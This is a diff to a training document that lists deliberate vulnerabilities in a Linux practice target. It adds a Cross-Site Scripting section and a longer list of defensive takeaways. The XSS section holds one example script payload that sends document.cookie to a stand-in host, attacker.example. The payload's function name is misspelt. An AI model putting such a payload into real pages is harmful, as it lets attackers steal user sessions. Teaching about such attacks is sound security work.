@@ -4,6 +4,19 @@ This document highlights the deliberate vulnerabilities included in the Linux ta
 
 ---
 
+## Cross-Site Scripting (XSS)
+**Description:** Cross-Site Scripting (XSS) happens when an application includes untrusted user input in pages sent to other users without proper validation or output encoding. Attackers inject client-side code (usually JavaScript) that the victim’s browser executes in the context of the site. Because the code runs in users’ browsers, XSS can steal session tokens, perform actions on behalf of users, display spoofed UI, or be chained with other flaws.   
+**Educational Purpose:** Students will exploit stored, reflected, and DOM-based XSS in controlled exercises to learn how payloads execute in victims’ browsers, how data (cookies, localStorage, form values) can be exfiltrated, and how to defend against these attacks via context-aware output encoding, input validation, and Content Security Policy (CSP).  
+**Real-World Relevance:** XSS is a long-standing, common web vulnerability (historically in the OWASP Top 10). While it typically targets users rather than servers directly, consequences include account takeover, phishing, and platform abuse. High-profile incidents (e.g., the 2005 MySpace “Samy” worm and the 2014 TweetDeck XSS issue) demonstrate rapid propagation and real impact on large user bases.  
+
+**Example:** A comment field accepts HTML without encoding. An attacker posts:  
+'''html
+<script>fetch('https://attacker.example/steal?c='+encodedURIComponent(document.cookie))</script>
+'''  
+When other users load the comment, their browsers execute the script and send session cookies to the attacker, enabling hijack of user accounts.  
+
+---
+
 ## SQL Injection
 **Description:** SQL injection occurs when user input is improperly sanitized, allowing attackers to manipulate backend database queries.  
 **Educational Purpose:** Students will exploit SQL injection to retrieve sensitive information from the database and understand how unsanitized input can be dangerous.  
@@ -32,7 +45,10 @@ This document highlights the deliberate vulnerabilities included in the Linux ta
 ---
 
 ## Key Takeaways
-- Always validate and sanitize user inputs.
-- Employ strong authentication and password policies.
-- Restrict file upload types and implement access controls.
-- Learn to think like an attacker to design better defenses.
+- Always validate and sanitise user inputs according to the expected context.  
+- Apply context-aware output encoding (HTML, attribute, JS, URL).  
+- Use parameterised queries / prepared statements for DB access.  
+- Enforce strong authentication, rate-limiting, and MFA where practical.  
+- Restrict upload types, check file contents, and store uploads outside the web root.  
+- Implement security headers (CSP, X-Content-Type-Options) and HttpOnly/Secure cookie flags.  
+- Regularly test with automated scanners and manual review; learn to think like an attacker to design better defenses.
